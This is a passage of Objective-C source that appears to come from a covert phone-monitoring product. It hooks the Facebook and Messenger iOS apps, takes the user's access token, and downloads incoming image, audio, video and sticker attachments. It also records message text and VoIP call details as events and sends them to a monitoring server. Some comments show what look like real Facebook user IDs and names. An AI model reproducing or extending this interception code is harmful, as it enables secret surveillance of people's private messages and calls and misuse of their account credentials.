						urlForImage = [NSString stringWithFormat:@"https://api.facebook.com/method/messaging.getAttachment%@&access_token=%@",[ArrayForKey objectAtIndex:1],[facebookCredentials accessToken]];				
					}
					DLog(@"********************* urlForImage %@",urlForImage);
					
					facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.jpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
					NSURL * link = [NSURL URLWithString:urlForImage];
					NSData *datatowrite = [NSData dataWithContentsOfURL:link];				
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
					
					FxAttachment *attachment = [[FxAttachment alloc] init];
					[attachment setFullPath:facebookAttachmentPath];
					[attachments addObject:attachment];			
					[attachment release];
				} else {
					// CASE 2: FB Messenger version 3.0			
					NSDictionary *imageInfo		= [item objectForKey:@"image_data"];
					DLog (@"image_data info = %@", imageInfo)				
					NSString *previewUrl		= [imageInfo objectForKey:@"preview_url"];
					NSData *thumbnail			= [NSData dataWithContentsOfURL:[NSURL URLWithString:previewUrl]];
					NSString *url				= [imageInfo objectForKey:@"url"];
					NSData *datatowrite			= [NSData dataWithContentsOfURL:[NSURL URLWithString:url]];
					DLog (@"datatowrite = %lu", (unsigned long)[datatowrite length])
					
					facebookAttachmentPath		= [NSString stringWithFormat:@"%@%@%f%d.jpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];					
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
                    
                    if (datatowrite == nil) {
                        DLog(@"Cannot download image data...");
                        facebookAttachmentPath = @"image/jpeg";
                    }
                    if (thumbnail == nil) {
                        DLog(@"Cannot download image thumbnail data...");
                    }
					
					FxAttachment *attachment	= [[FxAttachment alloc] init];
					[attachment setMThumbnail:thumbnail];
					[attachment setFullPath:facebookAttachmentPath];
					[attachments addObject:attachment];			
					[attachment release];			
				}			
			} 
			
			[url release];
			
#pragma mark Audio
			
		// -- Audio
		} else if ([mytype rangeOfString:@"audio"].location != NSNotFound) {
			//=========Fix msg just delete it if cause error
			if([[msg text]length]==0){
				[imEvent setMRepresentationOfMessage:kIMMessageNone];
			}
			//=========Fix msg just delete it if cause error
			Class $AttachmentURLFormatter = objc_getClass("AttachmentURLFormatter");
			AttachmentURLFormatter *url = nil;
			DLog (@"$AttachmentURLFormatter = %@", $AttachmentURLFormatter)
			if ([$AttachmentURLFormatter respondsToSelector:@selector(urlFormatterWithFacebook:)]) {
				url = [[$AttachmentURLFormatter alloc]init];
			} else if ([$AttachmentURLFormatter respondsToSelector:@selector(urlFormatterWithURLRequestFormatter:)]) {
				FBMURLRequestFormatter *fbmURLRequestFormatter = [[FacebookUtils shareFacebookUtils] mFBMURLRequestFormatter];
				url = [$AttachmentURLFormatter urlFormatterWithURLRequestFormatter:fbmURLRequestFormatter];
				
				//DLog (@"Construct link to get audio file from Facebook server")
				//NSString *linkToAudio = [url urlForAttachment:
				//						 [[attachmentMap allKeys]objectAtIndex:i]
				//									messageId:[msg messageId]
				//									  preview:NO];
				//DLog (@"linkToAudio = %@", linkToAudio)
			}
			DLog (@"URL formatter = %@", url)
			
#pragma mark Audio Facebook Application
			
			if([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Facebook"]){
				NSString * urlForAudio = [NSString stringWithFormat:@"%@",[url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] messageId:[msg messageId] preview:NO]];
				NSArray * ArrayForKey = [urlForAudio componentsSeparatedByString:@"(null)"];
				
				NSString * checkurl = nil;
                DLog(@"before urlForAudio %@",urlForAudio);
				if ([ArrayForKey count] >= 2) {
					checkurl = [ArrayForKey objectAtIndex:1];
				}
				DLog (@"checkurl = %@", checkurl)
				DLog(@"********************* urlForAudio %@",urlForAudio);
				
				NSData *datatowrite = nil;
				
				if ([checkurl length] > 0) {
					if ([checkurl rangeOfString:@"messaging.getAttachment"].location != NSNotFound) {
						urlForAudio = [NSString stringWithFormat:@"https://api.facebook.com/method/%@",[ArrayForKey objectAtIndex:1]];
					}else{
						urlForAudio = [NSString stringWithFormat:@"https://api.facebook.com/method/messaging.getAttachment%@",[ArrayForKey objectAtIndex:1]];
					}
					
					NSURL * link = [NSURL URLWithString:urlForAudio];
					datatowrite = [NSData dataWithContentsOfURL:link];
				} else {
					// There is no (null) in urlForAudio thus use it...
					NSURL * link = [NSURL URLWithString:urlForAudio];
					datatowrite = [NSData dataWithContentsOfURL:link];
				}
                
                /*
                 Facebook 8.0 (may be 7.0 also) there is no class AttachmentURLFormatter any more, thus the above logic is obsolete from this version onward
                 */
                if (url == nil) {
                    DLog (@"Attchment formatter is nil")
					Class $FBMAttachmentURLParams = objc_getClass("FBMAttachmentURLParams");
					FBMAttachmentURLParams *attachmentParams = [$FBMAttachmentURLParams attachmentURLParamsWithAttachmentID:[item objectForKey:@"id"] messageID:[msg messageId] isPreview:NO];
					FBMBaseAttachmentURLFormatter *attachmentUrlFormatter = [[FacebookUtils shareFacebookUtils] mFBMBaseAttachmentURLFormatter];
					NSURL *attachmentUrl = [attachmentUrlFormatter urlForAttachmentURLParams:attachmentParams];
					urlForAudio = [attachmentUrl absoluteString];
					
					DLog (@"$FBMAttachmentURLParams = %@", $FBMAttachmentURLParams)
					DLog (@"attchmentParams			= %@", attachmentParams)
					DLog (@"attachmentUrlFormatter	= %@", attachmentUrlFormatter)
					DLog (@"attachmentUrl			= %@", attachmentUrl)
                    
                    NSURL * link = [NSURL URLWithString:urlForAudio];
					datatowrite = [NSData dataWithContentsOfURL:link];
                }
				
				facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.mpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
				DLog (@"datatowrite = %lu", (unsigned long)[datatowrite length])
				[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
                
                if (datatowrite == nil) {
                    DLog(@"Cannot download audio data...");
                    facebookAttachmentPath = @"audio/mpeg";
                }
				
				FxAttachment *attachment = [[FxAttachment alloc] init];
				[attachment setFullPath:facebookAttachmentPath];
				[attachments addObject:attachment];			
				[attachment release];
			}
#pragma mark Audio Facebook Messenger Application
			else if ([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Messenger"]){
				
				NSString * urlForAudio = [NSString stringWithFormat:@"%@",[url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] 
																					  messageId:[msg messageId]
																						preview:NO]];
								
				DLog(@"urlForAudio %@",urlForAudio);
				NSArray * arrayForKey = [urlForAudio componentsSeparatedByString:@"(null)"];					
				DLog(@"ArrayForKey %@", arrayForKey)
				
				/*********************************************************************************************
					- FIXED ISSUE -
					This is to fix the issue of crash of incoming voice in Facebook Messenger version  3.0, 3.0.1.
					For FB Messenger 3.0, the variable urlForAudio will contain the full url which is used to download
					the voice record right away
						CASE 1: FB Messenger version 3.0
						CASE 2: FB Messenger version earlier than 3.0
				 *********************************************************************************************/
				if ([urlForAudio rangeOfString:@"https://api.facebook.com/method/messaging.getAttachment"].location == NSNotFound) {  
					// -- CASE 2: FB Messenger version EARLIER than 3.0
					FBAuthenticationManagerImpl *fbAuthenManagerImpl	= [[FacebookUtils shareFacebookUtils]mFBAuthenManagerImpl];
					FBFacebookCredentials * facebookCredentials			= [fbAuthenManagerImpl facebookCredentials];					
					NSString * checkurl = [arrayForKey objectAtIndex:1];											
					if ([checkurl rangeOfString:@"messaging.getAttachment"].location != NSNotFound) {
						urlForAudio = [NSString stringWithFormat:@"https://api.facebook.com/method/%@&access_token=%@", checkurl, [facebookCredentials accessToken]];
					} else {
						urlForAudio = [NSString stringWithFormat:@"https://api.facebook.com/method/messaging.getAttachment%@&access_token=%@", checkurl, [facebookCredentials accessToken]];
					}								
				}
				
				// Messenger 3.1 (there is no class AttachmentURLFormatter in Messenger 3.1)
				if (url == nil) {
					DLog (@"Attchment formatter is nil")
					Class $FBMAttachmentURLParams = objc_getClass("FBMAttachmentURLParams");
					FBMAttachmentURLParams *attachmentParams = [$FBMAttachmentURLParams attachmentURLParamsWithAttachmentID:[item objectForKey:@"id"] messageID:[msg messageId] isPreview:NO];
					FBMBaseAttachmentURLFormatter *attachmentUrlFormatter = [[FacebookUtils shareFacebookUtils] mFBMBaseAttachmentURLFormatter];
					NSURL *attachmentUrl = [attachmentUrlFormatter urlForAttachmentURLParams:attachmentParams];
					urlForAudio = [attachmentUrl absoluteString];
					
					DLog (@"$FBMAttachmentURLParams = %@", $FBMAttachmentURLParams)
					DLog (@"attchmentParams			= %@", attachmentParams)
					DLog (@"attachmentUrlFormatter	= %@", attachmentUrlFormatter)
					DLog (@"attachmentUrl			= %@", attachmentUrl)
				}
														
				DLog(@"********************* urlForAudio %@", urlForAudio);
				
				facebookAttachmentPath		= [NSString stringWithFormat:@"%@%@%f%d.mpeg",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];							
				NSURL * link				= [NSURL URLWithString:urlForAudio];
				NSData *datatowrite			= [NSData dataWithContentsOfURL:link];
				[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
                
                if (datatowrite == nil) {
                    DLog(@"Cannot download audio data...");
                    facebookAttachmentPath = @"audio/mpeg";
                }
				
				FxAttachment *attachment	= [[FxAttachment alloc] init];
				[attachment setFullPath:facebookAttachmentPath];
				[attachments addObject:attachment];			
				[attachment release];				
			}
			
			if ([$AttachmentURLFormatter respondsToSelector:@selector(urlFormatterWithFacebook:)]) {
				[url release];
			}
		} else {
#pragma mark Others attachment type in offline Facebook only (seem flow never come here with Facebook 6.7 thus the code may be obsolete)
#pragma mark Video and others, Messenger 5.0, Facebook 9.0 used code below to capture video attachments
			DLog(@"+++++++++++++++++++ OFFLINE MESSAGE OR VIDEO OR OTHER TYPES OF ATTACHMENT +++++++++++++++++++++")
			
			//======== facebook can send 1 file per time at this time
			NSMutableDictionary * item = [attachmentMap objectForKey:[[attachmentMap allKeys]objectAtIndex:0]];
			NSString * attachFilename = [item objectForKey:@"filename"] ;

			NSString * type = [IMShareUtils mimeType:attachFilename];
			if([type length]>0){	
				//=========Fix msg just delete it if cause error
				if([[msg text]length]==0){
					[imEvent setMRepresentationOfMessage:kIMMessageNone];
				}
				//=========Fix msg just delete it if cause error
				Class $AttachmentURLFormatter = objc_getClass("AttachmentURLFormatter");
				AttachmentURLFormatter *url = nil;
				if ([$AttachmentURLFormatter respondsToSelector:@selector(urlFormatterWithFacebook:)]) {
					url = [[$AttachmentURLFormatter alloc]init];
				} else if ([$AttachmentURLFormatter respondsToSelector:@selector(urlFormatterWithURLRequestFormatter:)]) {
					FBMURLRequestFormatter *fbmURLRequestFormatter = [[FacebookUtils shareFacebookUtils] mFBMURLRequestFormatter];
					url = [$AttachmentURLFormatter urlFormatterWithURLRequestFormatter:fbmURLRequestFormatter];
				}
				DLog (@"URL formatter = %@", url)
					
				if ([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Facebook"]) {
					NSString * urlForitem = [NSString stringWithFormat:@"%@",[url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] messageId:[msg messageId] preview:NO]];
					NSArray * ArrayForKey = [urlForitem componentsSeparatedByString:@"(null)"];
					
					NSString * checkurl = nil;
					if ([ArrayForKey count] >= 2) {
						checkurl = [ArrayForKey objectAtIndex:1];
					}
					DLog (@"checkurl = %@", checkurl)
					DLog(@"********************* urlForitem %@",urlForitem);
					
					NSData *datatowrite = nil;
					
					if ([checkurl length] > 0) {
						if ([checkurl rangeOfString:@"messaging.getAttachment"].location != NSNotFound) {
							urlForitem = [NSString stringWithFormat:@"https://api.facebook.com/method/%@",[ArrayForKey objectAtIndex:1]];
						}else{
							urlForitem = [NSString stringWithFormat:@"https://api.facebook.com/method/messaging.getAttachment%@",[ArrayForKey objectAtIndex:1]];
						}
						
						NSURL * link = [NSURL URLWithString:urlForitem];
						datatowrite = [NSData dataWithContentsOfURL:link];
					} else {
						// There is no (null) in urlForAudio thus use it...
						NSURL * link = [NSURL URLWithString:urlForitem];
						datatowrite = [NSData dataWithContentsOfURL:link];
					}
                    
                    NSDictionary *videoInfo = nil;
                    NSData *thumbnail = nil;
                    if (datatowrite == nil) {
                        // Facebook 6.7, ..., 9.0
                        videoInfo = [item objectForKey:@"video_data"];
                        DLog (@"videoInfo = %@", videoInfo)
                        
                        NSString *previewUrl = [videoInfo objectForKey:@"preview_url"];
                        thumbnail = [NSData dataWithContentsOfURL:[NSURL URLWithString:previewUrl]];
                        NSString *url = [videoInfo objectForKey:@"url"];
                        datatowrite = [NSData dataWithContentsOfURL:[NSURL URLWithString:url]];
                    }
					
                    if (videoInfo != nil) {
                        facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.mp4",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
                    } else {
                        facebookAttachmentPath = [NSString stringWithFormat:@"%@%@%f%d.unknown",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
                    }
					DLog (@"datatowrite = %lu", (unsigned long)[datatowrite length])
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
                    
                    if (datatowrite == nil) {
                        DLog(@"Cannot download video or other types data...");
                        facebookAttachmentPath = @"video/mp4";
                    }
                    if (thumbnail == nil) {
                        DLog(@"Cannot download video or other types thumbnail data...");
                    }
					
					FxAttachment *attachment = [[FxAttachment alloc] init];	
					[attachment setFullPath:facebookAttachmentPath];
                    [attachment setMThumbnail:thumbnail];
					[attachments addObject:attachment];
					[attachment release];
                    
				} else if ([[[NSBundle mainBundle] bundleIdentifier]isEqualToString:@"com.facebook.Messenger"]) {
					
					NSString * urlForitem = [NSString stringWithFormat:@"%@",[url urlForAttachment:[[attachmentMap allKeys]objectAtIndex:i] 
																						  messageId:[msg messageId]
																							preview:NO]];
					
					DLog(@"urlForitem %@",urlForitem);
					NSArray * arrayForKey = [urlForitem componentsSeparatedByString:@"(null)"];					
					DLog(@"arrayForKey %@", arrayForKey)
					
					/*********************************************************************************************
					 - FIXED ISSUE -
					 This is to fix the issue of crash of incoming voice in Facebook Messenger version  3.0, 3.0.1.
					 For FB Messenger 3.0, the variable urlForAudio will contain the full url which is used to download
					 the voice record right away
					 CASE 1: FB Messenger version 3.0
					 CASE 2: FB Messenger version earlier than 3.0
					 *********************************************************************************************/
					if ([urlForitem rangeOfString:@"https://api.facebook.com/method/messaging.getAttachment"].location == NSNotFound) {  
						// -- CASE 2: FB Messenger version EARLIER than 3.0
						FBAuthenticationManagerImpl *fbAuthenManagerImpl	= [[FacebookUtils shareFacebookUtils]mFBAuthenManagerImpl];
						FBFacebookCredentials * facebookCredentials			= [fbAuthenManagerImpl facebookCredentials];					
						NSString * checkurl = [arrayForKey objectAtIndex:1];											
						if ([checkurl rangeOfString:@"messaging.getAttachment"].location != NSNotFound) {
							urlForitem = [NSString stringWithFormat:@"https://api.facebook.com/method/%@&access_token=%@", checkurl, [facebookCredentials accessToken]];
						} else {
							urlForitem = [NSString stringWithFormat:@"https://api.facebook.com/method/messaging.getAttachment%@&access_token=%@", checkurl, [facebookCredentials accessToken]];
						}								
					}
                    
                    // Messenger 3.1 (there is no class AttachmentURLFormatter in Messenger 3.1)
                    if (url == nil) {
                        DLog (@"Attchment formatter is nil")
                        Class $FBMAttachmentURLParams = objc_getClass("FBMAttachmentURLParams");
                        FBMAttachmentURLParams *attachmentParams = [$FBMAttachmentURLParams attachmentURLParamsWithAttachmentID:[item objectForKey:@"id"] messageID:[msg messageId] isPreview:NO];
                        FBMBaseAttachmentURLFormatter *attachmentUrlFormatter = [[FacebookUtils shareFacebookUtils] mFBMBaseAttachmentURLFormatter];
                        NSURL *attachmentUrl = [attachmentUrlFormatter urlForAttachmentURLParams:attachmentParams];
                        urlForitem = [attachmentUrl absoluteString];
                        
                        DLog (@"$FBMAttachmentURLParams = %@", $FBMAttachmentURLParams)
                        DLog (@"attchmentParams			= %@", attachmentParams)
                        DLog (@"attachmentUrlFormatter	= %@", attachmentUrlFormatter)
                        DLog (@"attachmentUrl			= %@", attachmentUrl)
                    }
					
					DLog(@"********************* urlForitem %@", urlForitem);
                    
                    // For video attachment (Messenger 5.0)
                    NSDictionary *videoInfo = [item objectForKey:@"video_data"];
                    NSString *preview_url = [videoInfo objectForKey:@"preview_url"];
                    NSString *video_url = [videoInfo objectForKey:@"url"];
                    
                    NSData *previewData = nil;
                    if (preview_url != nil) {
                        previewData = [NSData dataWithContentsOfURL:[NSURL URLWithString:preview_url]];
                    }
                    DLog(@"********************* video_url %@", video_url);
                    DLog(@"********************* preview_url %@", preview_url);
                    DLog(@"********************* preview data length %lu", (unsigned long)[previewData length]);
					
                    if (videoInfo != nil) {
                        facebookAttachmentPath	= [NSString stringWithFormat:@"%@%@%f%d.mp4",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
                    } else {
                        facebookAttachmentPath	= [NSString stringWithFormat:@"%@%@%f%d.unknown",facebookAttachmentPath,[msg messageId],[[NSDate date]timeIntervalSince1970],i];
                    }
					NSURL * link				= [NSURL URLWithString:urlForitem];
					NSData *datatowrite			= [NSData dataWithContentsOfURL:link];
					[datatowrite writeToFile:facebookAttachmentPath atomically:YES];
                    
                    if (datatowrite == nil) {
                        DLog(@"Cannot download video or other types data...");
                        facebookAttachmentPath = @"video/mp4";
                    }
                    if (previewData == nil) {
                        DLog(@"Cannot download video or other types thumbnail data...");
                    }
					
					FxAttachment *attachment	= [[FxAttachment alloc] init];	
					[attachment setFullPath:facebookAttachmentPath];
                    [attachment setMThumbnail:previewData];
					[attachments addObject:attachment];			
					[attachment release];				
				}
				
				if ([$AttachmentURLFormatter respondsToSelector:@selector(urlFormatterWithFacebook:)]) {
					[url release];
				}
				
			} else {
				DLog(@"No support mimetype -- OFFLINE --")
			}		
		}
	}
	
	/***********************************************************
	 If no attachment, it means that the incoming attachment
	 is not downloaded in time.
	 ***********************************************************/	
	if ([attachments count] == 0) {	// cannot download attachment in time			
		NSString *newMessage = nil;
		
		// CASE 1: Send attachment without text
		if (![imEvent mMessage]	|| [[imEvent mMessage] isEqualToString:@""]) { 
			DLog (@"Assign admin text to the incoming attachment event: %@ (Sending attachment WITHOUT text)", [originalMessage adminText])
			newMessage = [originalMessage adminText];
		}
		// CASE 2: Send attachment with text
		else {
			DLog (@"Assign admin text to the incoming attachment event: %@ (Sending attachment WITH text)", [originalMessage adminText])
			/* e.g.,	Hello World
						You sent an image
			 */
			/*
			 Offline message have "adminText" the same as "text" in case of message without attachment thus application will capture as:
			 e.g.,	text:		One Two Three
					adminText:	One Two Three
			 ==>	One Two Three [One Two Three]
			 */
			
			if ([[originalMessage text] isEqualToString:[originalMessage adminText]]) {
				DLog (@"Admin text and user type text is the same...")
				newMessage = [originalMessage text];
			} else {
				newMessage = [[imEvent mMessage] stringByAppendingFormat:@"\n [%@]", [originalMessage adminText]];
			}
		}
		[imEvent setMMessage:newMessage];
		
		if([[imEvent mMessage] length]==0){
			[imEvent setMRepresentationOfMessage:kIMMessageNone];
		} else {
			[imEvent setMRepresentationOfMessage:kIMMessageText];
		}
	} else {
		/*******************************************************************************************************
		 CASE:
		 Attachment count not zero, in case of sticker, Messenger 3.0.1 sometime have incoming sticker <adminText>
		 and <text> in message are the same this cause the sticker content text e.g: "Why Skinner sent a sticker."
		 thus we need to remove text in case of sticker to make sure that incoming sticker never have text.
		 *******************************************************************************************************/
		if ([imEvent mRepresentationOfMessage] == kIMMessageSticker) {
			DLog (@"Sticker is an attachment thus reset the text to nothing;;;")
			FxAttachment *stickerAttachment = [attachments objectAtIndex:0];
			if ([[stickerAttachment mThumbnail] length] > 0) {
				// If there is a sticker data then we safe to remove the text message
				[imEvent setMMessage:@""];
			}
		}
	}

	[imEvent setMAttachments:attachments];
	
	DLog (@"Send facebook event to server");
	[FacebookUtils sendFacebookEvent:imEvent];
	
	[attachments release];
	[msg release];
	[imEvent release];
	[originalMessage release];
	[fbmThread release];
	[messageAttachments release];
	
	[pool release];
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0;i<[aAttachmentArray count];i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if(deletesuccess){
			DLog (@"Deleting file %@",path );
		}else{
			DLog (@"Fail deleting file %@",path );
		}
	}
}


#pragma mark -
#pragma mark VoIP
#pragma mark -


#pragma mark VoIP (public method)


+ (BOOL) isVoIPMessage: (ThreadMessage *) aThreadMessage withThread: (FBMThread *) aThread {
    DLog (@"debugDescription        = %@", [aThreadMessage debugDescription])
    DLog (@"logMessage              = %@", [aThreadMessage logMessage])
	DLog (@"Thread message type		= %d", [aThreadMessage type])
	if ([aThreadMessage respondsToSelector:@selector(isNonUserGeneratedLogMessage)]) {
        DLog (@"isNonUserGeneratedLogMessage    = %d", [aThreadMessage isNonUserGeneratedLogMessage])
    }
    
	BOOL isVoIPMessage = NO;
	/*
     - This logic is apply to Facebook Messenger below 9.0
	 Note that for VoIP message, these arguments will have the below values
		isNonUserGeneratedLogMessage = 1
		type	= 6, 7 (Messenger 2.7, Facebook 6.5)
		source	= 5
	 For user-typed message, these arguments will have the below values
		isNonUserGeneratedLogMessage = 1
		type	= 0
		source	= 4
	 */
    
    /*
     In FB Messenger 4.0, 4.1, there is new feature call group chat; when user create new group chat
     application will capture extra VoIP event that's reason we need to check participant count
     */
    id participants = nil;
    
    if ([aThread respondsToSelector:@selector(participants)]) {
        /*
         "userId: 100005487965704 name: Developa Developalast email: TODO rrTs 0 drTs: 0",
         "userId: 100008262244320 name: Somsritwo Teamtho email: TODO rrTs 1422332362986 drTs: 1424084916140"

         */
        participants = [aThread participants];
    } else if ([aThread respondsToSelector:@selector(participantsByUserId)]) {
        /*
         100005487965704 = "userId: 100005487965704 name: Developa Developalast email: TODO rrTs 0 drTs: 0";
         100008262244320 = "userId: 100008262244320 name: Somsritwo Teamtho email: TODO rrTs 1422332362986 drTs: 1422332030620";
         */
        NSDictionary *participantsByUserIdDict = [aThread participantsByUserId];
        participants    = [participantsByUserIdDict allValues];     // extract NSArray from all values of NSDictionary
    }

    DLog(@"participants of thread, %@", participants);
    
    if ([aThreadMessage respondsToSelector:@selector(isNonUserGeneratedLogMessage)]) {
        if ([aThreadMessage isNonUserGeneratedLogMessage]				&&
            [(NSArray *)participants count] <= 2                                   &&
            ([aThreadMessage type] == 6 || [aThreadMessage type] == 7)) {
            isVoIPMessage = YES;
        }
    } else { // Messenger 9.0, 9.1
        /*
         logMessage of VoIP:
         
         1. logMessage add to thread in addPushMessage/thread:didSendMessage method
         
         {
         answered = 0;
         callee = "fbid:100001235909222";
         caller = "fbid:100001619597136";
         }
         
         2. logMessage add thread in messagesFromMessagesJson:... method
         
         callLog =     {
         callEndPoint = "";
         duration = 0;
         message = "";
         type = missed;
         };
         
         */
        NSDictionary *logMessage    = [aThreadMessage logMessage];
        NSString *callee            = [logMessage objectForKey:@"callee"];
        NSString *caller            = [logMessage objectForKey:@"caller"];
        NSDictionary *callLog       = [logMessage objectForKey:@"callLog"];
        
        isVoIPMessage = (callee != nil || caller != nil || callLog != nil );
    }
	return isVoIPMessage;
}

+ (FxVoIPEvent *) createFacebookVoIPEventFBMThread: (FBMThread *) aFBMThread 
									 threadMessage: (ThreadMessage *) aThreadMessage {
	
	NSString *messageText		= @"";
    
    
    Class $FBMStringWithRedactedDescription = objc_getClass("FBMStringWithRedactedDescription");
    
    if ([[aThreadMessage text] isKindOfClass:[NSString class]]) {
        messageText		= [aThreadMessage text];
    } else if ([[aThreadMessage text] isKindOfClass:[$FBMStringWithRedactedDescription class]]) {
        messageText     = [(FBMStringWithRedactedDescription *)[aThreadMessage text] rawContentValueOnlyToBeVisibleToUser];
    }
    
    DLog(@"DEBUG VOIP 1, %@", messageText)
	FBMessengerUser *meUser		= [FacebookUtils getMeUser];
	[meUser retain];
	NSString *senderId			= nil;
    if ([aThreadMessage respondsToSelector:@selector(senderInfo)]) {
        senderId = [(FBMParticipantInfo*)[aThreadMessage senderInfo] userId];
    } else {
        senderId = [(FBMPushedMessage *)aThreadMessage senderId];
    }
		
	FxEventDirection direction	= [FacebookUtils getVoIPDirectionWithMessageText:messageText	
																  threadMessage:aThreadMessage
																		 meUser:meUser
																	   senderID:senderId];		
	NSDictionary *contactInfo	= [FacebookUtils getVoIPContact:aFBMThread
													direction:direction
													   meUser:meUser
													 senderID:senderId];
	NSString *contactName		= nil;
	NSString *contactID			= nil;
	if (contactInfo) {
		contactName				= [contactInfo objectForKey:USERNAME_KEY];
		contactID				= [contactInfo objectForKey:USER_ID_KEY];
	}
	[meUser release];
	
	// -- create FxVoIPEvent		
	FxVoIPEvent *voIPEvent	= [[FxVoIPEvent alloc] init];	
	[voIPEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[voIPEvent setEventType:kEventTypeVoIP];															
	[voIPEvent setMCategory:kVoIPCategoryFacebook];	
	[voIPEvent setMDirection:direction];
	[voIPEvent setMDuration:0];			
	[voIPEvent setMUserID:contactID];										// participant id 
	[voIPEvent setMContactName:contactName];								// participant displayname
	[voIPEvent setMTransferedByte:0];
	[voIPEvent setMVoIPMonitor:kFxVoIPMonitorNO];
	[voIPEvent setMFrameStripID:0];				
	
	return [voIPEvent autorelease];
}

+ (void) sendFacebookVoIPEvent: (FxVoIPEvent *) aVoIPEvent {
	FacebookUtils *facebookUtils = [[FacebookUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(voIPthread:)
							 toTarget:facebookUtils 
						   withObject:aVoIPEvent];
	[facebookUtils autorelease];	
}


#pragma mark VoIP (private method)


/*
 This method is used for finding meUser
 It's used for VoIP event
 */
+ (FBMessengerUser *) getMeUser {
	FBAuthenticationManagerImpl *fbAuthenManagerImpl	= nil;
	fbAuthenManagerImpl									= [[FacebookUtils shareFacebookUtils] mFBAuthenManagerImpl];
	
	//==================================== mailboxViewer Facebook 6.0.1
	// For Facebook 6.0.1
	
	FBMessengerModuleAuthenticationManager *fbMessengerModuleAuthManager	= nil;
	fbMessengerModuleAuthManager											= [[FacebookUtils shareFacebookUtils] mFBMessengerModuleAuthManager];
	
	FBMessengerUser *meUser			= nil;
	if ([fbAuthenManagerImpl respondsToSelector:@selector(mailboxViewer)] ||
		[fbMessengerModuleAuthManager respondsToSelector:@selector(mailboxViewer)]) {		
		meUser			= [fbAuthenManagerImpl mailboxViewer]; // Messenger
		
		if (meUser == nil) {
			meUser		= [fbMessengerModuleAuthManager mailboxViewer]; // Facebook
			
			if (meUser == nil) {
				[fbMessengerModuleAuthManager prepareMailboxViewer];
				meUser	= [fbMessengerModuleAuthManager mailboxViewer];
				DLog (@"[1] meUser from prepare = %@", meUser);
			}
		}
		
	}
	// For Facebook Messenger 2.3.1 and Facebook version ealier than 6.0 and 6.0.1
	else {		
		meUser			= [fbAuthenManagerImpl meUser]; // Messenger
		
		if (meUser == nil) {
			meUser		= [fbMessengerModuleAuthManager meUser]; // Facebook
			
			if (meUser == nil) {
				[fbMessengerModuleAuthManager prepareMeUser];
				meUser	= [fbMessengerModuleAuthManager meUser];
				DLog (@"[2] meUser from prepare = %@", meUser);
			}
		}
	}
	return meUser;
}

+ (NSString *) getUserID {
	NSString *meUserId = nil;
	FBMessengerUser *meUser = [self getMeUser];
	if (meUser == nil) {
		// Try to get meUser in Facebook 6.7
		FBMAuthenticationManagerImpl *fbmAuthenticationManagerImpl = [[self shareFacebookUtils] mFBMAuthenticationManagerImpl];
        if (fbmAuthenticationManagerImpl) {
            meUserId = [NSString stringWithString:[fbmAuthenticationManagerImpl mailboxViewerUserID]];
        }
        
        if (!meUserId) { // Messenger 17.0 (meUserID is set in hook method of [MNAuthenticationManagerImpl init...]
            meUserId = [[self shareFacebookUtils] mMeUserID];
        }
	} else {
		// Older version of Facebook and Messenger (up to 2.7)
		meUserId = [NSString stringWithString:[meUser userId]];
	}
	DLog (@"meUserId = %@", meUserId);
	return (meUserId);
}

+ (NSDictionary *) getVoIPContact: (FBMThread *) aFBMThread
						direction: (FxEventDirection) aDirection 
						   meUser: (FBMessengerUser *) aMeUser 
						 senderID: (NSString *) aSenderID {
	DLog(@"------- findVoIPContact -----------");
	
	FBMThread *fbmThread				= aFBMThread;
	NSArray *origParticipants			= nil;		// All party concerned including target
    
    if ([aFBMThread respondsToSelector:@selector(participants)]) {
        origParticipants			= [fbmThread participants];
    } else if ([fbmThread respondsToSelector:@selector(participantsByUserId)]) {
        NSDictionary *participantsByUserIdDict = [fbmThread participantsByUserId];
        origParticipants = [participantsByUserIdDict allValues];            // extract NSArray from all values of NSDictionary
    }
    
	NSMutableArray *tempParticipants	= [[NSMutableArray alloc] initWithArray:origParticipants];	
	DLog (@"tempParticipants %@",tempParticipants)
	
	for (int i = 0; i < [origParticipants count]; i++) {
		FBMParticipantInfo *participantInfo		= nil;
		id object = [origParticipants objectAtIndex:i];
		
		// Fixed how to get participants in Faceook 6.7
		Class $FBMThreadUser = objc_getClass("FBMThreadUser");
		if ([object isKindOfClass:$FBMThreadUser]) { // Facebook 6.5 downward, Messenger 2.7 downward
			FBMThreadUser *user = object;
			participantInfo = [user participantInfo];
		} else {
			participantInfo = object;
		}
		
		DLog (@">>> userId = %@",	[participantInfo userId]);
		DLog (@">>> name = %@",		[participantInfo name]);
				
		if (aDirection == kEventDirectionOut) {
			DLog (@">>> Outgoing")			
			// -- Remove myself which is the sender
			if ([[participantInfo userId] isEqualToString:aSenderID])
				[tempParticipants removeObject:object];								
		} else if (aDirection == kEventDirectionIn	|| aDirection == kEventDirectionMissedCall) {
			DLog (@">>> In/Miss (%d)" , aDirection)				
			// -- Remove myself
